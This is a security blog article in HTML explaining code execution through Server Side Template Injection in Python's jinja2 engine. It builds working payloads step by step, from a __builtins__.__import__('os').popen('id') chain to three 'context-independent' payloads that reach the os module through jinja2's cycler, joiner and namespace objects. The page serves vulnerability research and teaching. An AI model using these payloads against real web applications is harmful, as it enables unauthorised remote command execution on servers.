<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Language" content="en">

    <meta name="author" content="Podalirius">
    <meta name="description" content="We will see how to create context-free payloads for jinja2, always allowing direct access to the os module in a jinja2 template without requirements. These payloads will be particularly useful for exploiting SSTI vulnerabilities.">
    <meta name="keywords" content="blog,security,exploits,writeups,cybersecurity,ctf,poc,reverse,shell,podalirius,vulnerabilities">

    

    <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/thumbnail_en.png"/>

<meta name="twitter:title" content="Python vulnerabilities : Code execution in jinja templates"/>
<meta name="twitter:description" content="We will see how to create context-free payloads for jinja2, always allowing direct access to the os module in a jinja2 template without requirements. These payloads will be particularly useful for exploiting SSTI vulnerabilities."/>

    <meta property="og:title" content="Python vulnerabilities : Code execution in jinja templates" />
<meta property="og:description" content="We will see how to create context-free payloads for jinja2, always allowing direct access to the os module in a jinja2 template without requirements. These payloads will be particularly useful for exploiting SSTI vulnerabilities." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/" />
<meta property="og:image" content="https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/thumbnail_en.png" />
<meta property="article:published_time" content="2021-07-27T15:00:00+00:00" />
<meta property="article:modified_time" content="2021-07-27T15:00:00+00:00" />


    
      <base href="https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/">
    
    <title>
  Python vulnerabilities : Code execution in jinja templates Â· Podalirius
</title>

    
      <link rel="canonical" href="https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/">
    

    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css" integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />

    
      
      
      <link rel="stylesheet" href="https://podalirius.net/en/css/coder.min.0e5ce5b959a68dfe0232c6ddcec1e8ef154517c968464707f3181c437fe611c0.css" integrity="sha256-k7DPSVQsOSWk2kclJMpGgr&#43;ZfzwfI5TgKhKftm0d8vQ=" crossorigin="anonymous" media="screen" />
    

    

    
      
        
        
        <link rel="stylesheet" href="https://podalirius.net/en/css/coder-dark.min.717236c74e0a5208ef73964a9f44c6b443b689a95b270d8b2a40d0c012460dac.css" integrity="sha256-cXI2x04KUgjvc5ZKn0TGtEO2ialbJw2LKkDQwBJGDaw=" crossorigin="anonymous" media="screen" />
      
    

    
      <link rel="stylesheet" href="https://podalirius.net/en/css/root-me.css" />
    
      <link rel="stylesheet" href="https://podalirius.net/en/css/list_articles.css" />
    

    

    <link rel="icon" type="image/png" href="https://podalirius.net/en/public/favicon.ico" sizes="32x32">
    <link rel="icon" type="image/png" href="https://podalirius.net/en/public/favicon.ico" sizes="16x16">

    </head>

  
  
    
  
  <body class="colorscheme-auto"
        onload=""
  >
    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="https://podalirius.net/en/">
      Podalirius
    </a>
    
      <span id="dark-mode-toggle" class="float-right">
        <i class="fas fa-adjust fa-fw"></i>
      </span>
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fas fa-bars fa-fw"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://podalirius.net/en/articles/">Articles</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://podalirius.net/en/writeups/">Writeups</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://podalirius.net/en/publications/">Publications</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://podalirius.net/en/cves/">CVEs</a>
            </li>
          
        
        
          
          
          
            
              
                <li class="navigation-item menu-separator">
                  <span>|</span>
                </li>
                
              
              <li class="navigation-item">
                <a href="https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/"><img style="vertical-align:middle; text-align: center; width: 1.75em;" src="https://podalirius.net/en/public/flag_fr.png" alt=""></a>
              </li>
            
          
        
        <li class="navigation-item separator">
          <span>|</span>
        </li>
      </ul>
    
  </section>
</nav>


      <div class="content">
        
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">Python vulnerabilities : Code execution in jinja templates</h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fas fa-calendar"></i>
              <time datetime='2021-07-27T15:00:00Z'>
                July 27, 2021
              </time>
            </span>
            <span class="reading-time">
              <i class="fas fa-clock"></i>
              5-minute read
            </span>
          </div>
          <div class="categories">
  <i class="fas fa-folder"></i>
    <a href="https://podalirius.net/en/categories/research/">research</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/categories/poc/">poc</a></div>

          <div class="tags">
  <i class="fas fa-tag"></i>
    <a href="https://podalirius.net/en/tags/python/">python</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/vulnerabilities/">vulnerabilities</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/jinja/">jinja</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/jinja2/">jinja2</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/code/">code</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/injection/">injection</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/exploit/">exploit</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/execution/">execution</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/server/">server</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/side/">side</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/template/">template</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/injection/">injection</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/contexte/">contexte</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/independant/">independant</a>
      <span class="separator">â¢</span>
    <a href="https://podalirius.net/en/tags/ssti/">ssti</a></div>

        </div>
      </header>

      <div>
        

        
            <strong>Table of contents :</strong>

            <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#the-jinja2-template-engine">The jinja2 template engine</a></li>
    <li><a href="#template-object-of-jinja2">Template object of jinja2</a></li>
    <li><a href="#execution-of-commands">Execution of commands</a></li>
    <li><a href="#the-templatereference-object">The TemplateReference object</a></li>
    <li><a href="#building-a-classic-payload">Building a classic payload</a></li>
    <li><a href="#a-context-independent-payload">A context-independent payload</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>

        <hr>
        

        <h2 id="introduction">Introduction</h2>
<p>Some time ago I presented an article on <a href="https://podalirius.net/en/en/articles/python-format-string-vulnerabilities/">format string vulnerabilities in Python</a> in which I explained the dangers of format strings, if they are misused. Today I&rsquo;m going to present a fairly similar vulnerability, allowing code execution in the templates of the <a href="https://github.com/pallets/jinja">jinja</a> module. This type of behavior is very useful for exploiting Server Side Template Injection (SSTI) vulnerabilities.</p>
<h2 id="the-jinja2-template-engine">The jinja2 template engine</h2>
<p>The jinja2 template engine allows you to generate documents (strings, web pages &hellip;) from templates. This greatly simplifies the code and saves time. For example for a website, instead of writing the header block <code>&lt;head&gt;</code> in all the pages, we can create a single <code>head.jinja2</code> template that will be included in all the pages. So when it is necessary to modify the content of the header, there will only be one file to modify.</p>
<p>Here is an example of a jinja2 template:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#0f0;font-weight:bold">&lt;!DOCTYPE html&gt;</span>
&lt;<span style="font-weight:bold">html</span> <span style="color:#007f7f">lang</span>=<span style="color:#0ff;font-weight:bold">&#34;en&#34;</span>&gt;
&lt;<span style="font-weight:bold">head</span>&gt;
    &lt;<span style="font-weight:bold">title</span>&gt;My Webpage&lt;/<span style="font-weight:bold">title</span>&gt;
    &lt;<span style="font-weight:bold">link</span> <span style="color:#007f7f">rel</span>=<span style="color:#0ff;font-weight:bold">&#34;stylesheet&#34;</span> <span style="color:#007f7f">href</span>=<span style="color:#0ff;font-weight:bold">&#34;/css/main.css&#34;</span>&gt;
&lt;/<span style="font-weight:bold">head</span>&gt;
&lt;<span style="font-weight:bold">body</span>&gt;
    &lt;<span style="font-weight:bold">ul</span> <span style="color:#007f7f">id</span>=<span style="color:#0ff;font-weight:bold">&#34;navigation&#34;</span>&gt;
    {% for item in navigation %}
        &lt;<span style="font-weight:bold">li</span>&gt;&lt;<span style="font-weight:bold">a</span> <span style="color:#007f7f">href</span>=<span style="color:#0ff;font-weight:bold">&#34;{{ item.href }}&#34;</span>&gt;{{ item.caption }}&lt;/<span style="font-weight:bold">a</span>&gt;&lt;/<span style="font-weight:bold">li</span>&gt;
    {% endfor %}
    &lt;/<span style="font-weight:bold">ul</span>&gt;

    &lt;<span style="font-weight:bold">h1</span>&gt;My Webpage&lt;/<span style="font-weight:bold">h1</span>&gt;
    {{ a_variable }}

    {# a comment #}
&lt;/<span style="font-weight:bold">body</span>&gt;
&lt;/<span style="font-weight:bold">html</span>&gt;
</code></pre></div><h2 id="template-object-of-jinja2">Template object of jinja2</h2>
<p>In the jinja2 engine, templates are created from the <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/">Template</a> object of the module. Thanks to this type of object, we can create templates very easily, in the same way as format strings:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt; <span style="color:#fff;font-weight:bold">from</span> jinja2 <span style="color:#fff;font-weight:bold">import</span> Template
&gt;&gt;&gt; msg = Template(<span style="color:#0ff;font-weight:bold">&#34;My name is {{ name }}&#34;</span>).render(name=<span style="color:#0ff;font-weight:bold">&#34;John Doe&#34;</span>)
&gt;&gt;&gt; <span style="color:#fff;font-weight:bold">print</span>(msg)
<span style="color:#0ff;font-weight:bold">&#39;My name is John Doe&#39;</span>
</code></pre></div><p>When we generate the string with <code>.render(...)</code> the jinja2 engine uses the <code>name=</code> object passed as a parameter and replaces it in the <code>{{ name }}</code> location of the template which gives us the result <code>'My name is John Doe'</code>.</p>
<h2 id="execution-of-commands">Execution of commands</h2>
<p>In Python, format strings allow us to access the properties of objects, but not to call the methods of these. In the <code>jinja2</code> engine, we can execute functions specific to objects passed as parameters. Let&rsquo;s take an example:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt; <span style="color:#fff;font-weight:bold">import</span> os
&gt;&gt;&gt; <span style="color:#fff;font-weight:bold">from</span> jinja2 <span style="color:#fff;font-weight:bold">import</span> Template
&gt;&gt;&gt; msg = Template(<span style="color:#0ff;font-weight:bold">&#34;My name is {{ s.upper() }}&#34;</span>).render(s=<span style="color:#0ff;font-weight:bold">&#34;thisisastring&#34;</span>)
&gt;&gt;&gt; <span style="color:#fff;font-weight:bold">print</span>(msg)
<span style="color:#0ff;font-weight:bold">&#39;My name is THISISASTRING&#39;</span>
</code></pre></div><p>Similarly, we can run commands if we have access to the <code>os</code> module from the<code> jinja2</code> Template:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt; <span style="color:#fff;font-weight:bold">import</span> os
&gt;&gt;&gt; <span style="color:#fff;font-weight:bold">from</span> jinja2 <span style="color:#fff;font-weight:bold">import</span> Template
&gt;&gt;&gt; msg = Template(<span style="color:#0ff;font-weight:bold">&#34;My name is {{ module.system(&#39;id&#39;) }}&#34;</span>).render(module=os)
uid=<span style="color:#ff0;font-weight:bold">1000</span>(user) gid=<span style="color:#ff0;font-weight:bold">1000</span>(user) groups=<span style="color:#ff0;font-weight:bold">1000</span>(user)
&gt;&gt;&gt; <span style="color:#fff;font-weight:bold">print</span>(msg)
<span style="color:#0ff;font-weight:bold">&#39;My name is 0&#39;</span>
</code></pre></div><p>In the example above, we import the <code>os</code> and<code> jinja2</code> modules and then we create a template. The template contains <code>{{ module.system('id') }}</code> allowing to call a function of the module used (here <code>os</code>). When rendering the template, <code>os.system('id')</code> is executed.</p>
<h2 id="the-templatereference-object">The TemplateReference object</h2>
<p>In jinja2 templates, we can use the <code>TemplateReference</code> object to reuse code blocks from the template. For example, to avoid rewriting the title all over the template, we can set the title in a block <code>{% block title%}</code> and retrieve it with <code>{{ self.title() }}</code> later on:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt; msg = jinja2.Template(<span style="color:#0ff;font-weight:bold">&#34;&#34;&#34;
</span><span style="color:#0ff;font-weight:bold">... &lt;title&gt;{% block title %}This is a title{</span><span style="color:#0ff;font-weight:bold">% e</span><span style="color:#0ff;font-weight:bold">ndblock %}&lt;/title&gt;
</span><span style="color:#0ff;font-weight:bold">... &lt;h1&gt;{{ self.title() }}&lt;/h1&gt;
</span><span style="color:#0ff;font-weight:bold">... &#34;&#34;&#34;</span>).render()
&gt;&gt;&gt; <span style="color:#fff;font-weight:bold">print</span>(msg)
&lt;title&gt;This is a title&lt;/title&gt;
&lt;h1&gt;This is a title&lt;/h1&gt;
&gt;&gt;&gt;
</code></pre></div><p>We can access the <code>TemplateReference</code> object without conditions, even without any variables supplied in the <code>render()</code>:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt; jinja2.Template(<span style="color:#0ff;font-weight:bold">&#34;My name is {{ self }}&#34;</span>).render()
<span style="color:#0ff;font-weight:bold">&#39;My name is &lt;TemplateReference None&gt;&#39;</span>
&gt;&gt;&gt;
</code></pre></div><p>We will therefore start from the <code>TemplateReference</code> object to build a payload allowing to access the <code>os</code> module.</p>
<h2 id="building-a-classic-payload">Building a classic payload</h2>
<p>A very classic idea is to use the <code>TemplateReference</code> object to access the <code>__builtins__</code> and use the <code>__import__</code> function to import the module we want directly. To do this, we must first go back to <code>__globals__</code> using the classic <code>self .__ init __.__ globals__</code> path:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt; jinja2.Template(<span style="color:#0ff;font-weight:bold">&#34;My name is {{ self.__init__.__globals__ }}&#34;</span>).render()
</code></pre></div><p>By doing this, we get a <code>dict</code> containing all the global variables:</p>
<p><img src="https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/self.__init__.__globals__.png" alt=""></p>
<p>In the <code>__globals__</code>, we can access Python&rsquo;s <code>__builtins__</code> functions. This set of functions is included natively in Python without the need for external libraries, and notably contains the <code>__import__</code> function. So we can use it directly to import the <code>os</code> module like this:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt; jinja2.Template(<span style="color:#0ff;font-weight:bold">&#34;My name is {{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).system(&#39;id&#39;) }}&#34;</span>).render()
uid=<span style="color:#ff0;font-weight:bold">1000</span>(user) gid=<span style="color:#ff0;font-weight:bold">1000</span>(user) groups=<span style="color:#ff0;font-weight:bold">1000</span>(user)
<span style="color:#0ff;font-weight:bold">&#39;My name is 0</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#39;</span>
</code></pre></div><p>Here the <code>system</code> function of the <code>os</code> module allows us to check that we can execute commands, but the result of the command is not reflected in the generated template (only the return code is shown). To return the result of the command, we need to use <code>os.popen(command).read()</code> like this:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt; jinja2.Template(<span style="color:#0ff;font-weight:bold">&#34;My name is {{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read() }}&#34;</span>).render()
uid=<span style="color:#ff0;font-weight:bold">1000</span>(user) gid=<span style="color:#ff0;font-weight:bold">1000</span>(user) groups=<span style="color:#ff0;font-weight:bold">1000</span>(user)
<span style="color:#0ff;font-weight:bold">&#39;My name is uid=1000(user) gid=1000(user) groups=1000(user)</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#39;</span>
</code></pre></div><p>And we can now run system commands from a jinja template!</p>
<h2 id="a-context-independent-payload">A context-independent payload</h2>
<p>The problem with the previous method is that <code>__builtins__</code> are often restricted or filtered. So we have to try to find a module where <code>os</code> is already imported, and try to access it. In the source of the <code>jinja2</code> module, we see that the <code>os</code> module is imported into the <code>utils.py</code> file, (So the <code>os</code> module is accessible at <code>jinja2.utils.os</code>). We can confirm it very simply:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt; <span style="color:#fff;font-weight:bold">import</span> jinja2
&gt;&gt;&gt; jinja2.utils.os
&lt;module <span style="color:#0ff;font-weight:bold">&#39;os&#39;</span> <span style="color:#fff;font-weight:bold">from</span> <span style="color:#0ff;font-weight:bold">&#39;/usr/lib/python3.8/os.py&#39;</span>&gt;
&gt;&gt;&gt;
</code></pre></div><p>If we go back to our <code>TemplateReference</code> object presented above, we can find a very interesting internal attribute, <code>_TemplateReference__context</code>. This attribute is very interesting because it allows access to three variables <code>cycler</code>, <code>joiner</code> and <code>namespace</code> all present in the <code>utils.py</code> file where the <code>os</code> module is also imported.</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt; jinja2.Template(<span style="color:#0ff;font-weight:bold">&#34;My name is {{ e(self._TemplateReference__context) }}&#34;</span>).render(e=<span style="color:#fff;font-weight:bold">lambda</span> x:<span style="color:#fff;font-weight:bold">vars</span>(x))
<span style="color:#0ff;font-weight:bold">&#34;My name is {&#39;parent&#39;: {&#39;range&#39;: &lt;class &#39;range&#39;&gt;, &#39;dict&#39;: &lt;class &#39;dict&#39;&gt;, &#39;lipsum&#39;: &lt;function generate_lorem_ipsum at 0x7f62df526940&gt;, &#39;cycler&#39;: &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &#39;joiner&#39;: &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &#39;namespace&#39;: &lt;class &#39;jinja2.utils.Namespace&#39;&gt;, &#39;e&#39;: &lt;function &lt;lambda&gt; at 0x7f62de305790&gt;}, &#39;vars&#39;: {}, &#39;environment&#39;: &lt;jinja2.environment.Environment object at 0x7f62dfded040&gt;, &#39;eval_ctx&#39;: &lt;jinja2.nodes.EvalContext object at 0x7f62de22b760&gt;, &#39;exported_vars&#39;: set(), &#39;name&#39;: None, &#39;blocks&#39;: {}}&#34;</span>
</code></pre></div><p>Once we get to the right submodule, all we have to do is go back to the <code>__globals__</code> to directly access the <code>os</code> module:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt; jinja2.Template(<span style="color:#0ff;font-weight:bold">&#34;My name is {{ self._TemplateReference__context.cycler.__init__.__globals__.os }}&#34;</span>).render()
<span style="color:#0ff;font-weight:bold">&#34;My name is &lt;module &#39;os&#39; from &#39;/usr/lib/python3.8/os.py&#39;&gt;&#34;</span>

&gt;&gt;&gt; jinja2.Template(<span style="color:#0ff;font-weight:bold">&#34;My name is {{ self._TemplateReference__context.joiner.__init__.__globals__.os }}&#34;</span>).render()
<span style="color:#0ff;font-weight:bold">&#34;My name is &lt;module &#39;os&#39; from &#39;/usr/lib/python3.8/os.py&#39;&gt;&#34;</span>

&gt;&gt;&gt; jinja2.Template(<span style="color:#0ff;font-weight:bold">&#34;My name is {{ self._TemplateReference__context.namespace.__init__.__globals__.os }}&#34;</span>).render()
<span style="color:#0ff;font-weight:bold">&#34;My name is &lt;module &#39;os&#39; from &#39;/usr/lib/python3.8/os.py&#39;&gt;&#34;</span>
&gt;&gt;&gt;
</code></pre></div><p>Here are 3 context-independent payloads, always allowing access to the <code>os</code> module in a template rendered by the jinja2 engine:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os }}
</code></pre></div><h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/pallets/jinja">https://github.com/pallets/jinja</a></li>
<li><a href="https://zetcode.com/python/jinja/">https://zetcode.com/python/jinja/</a></li>
<li><a href="https://jinja.palletsprojects.com/en/3.0.x/">https://jinja.palletsprojects.com/en/3.0.x/</a></li>
<li><a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/</a></li>
<li><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a></li>
<li><a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f</a></li>
</ul>

      </div>


      <footer>
        


        
        
        
      </footer>
    </article>

    
  </section>

      </div>

      
  <footer class="footer">
    <section class="container">
      
      
        Â©
        
        2024
         Podalirius 
      
      
      
    </section>
  </footer>

    </main>

    
      
      <script src="https://podalirius.net/en/js/dark-mode.min.428c440847d7313f0cc29c7520e8e6f0b8234c90b989d06b243e7fdb314bd866.js"></script>
    

    
      <script src="https://podalirius.net/en/js/list_articles.js"></script>
    

    

    

    <script data-goatcounter="https://706f64616c6972697573.goatcounter.com/count"
        async src="//gc.zgo.at/count.js"></script>


    

  </body>

</html>
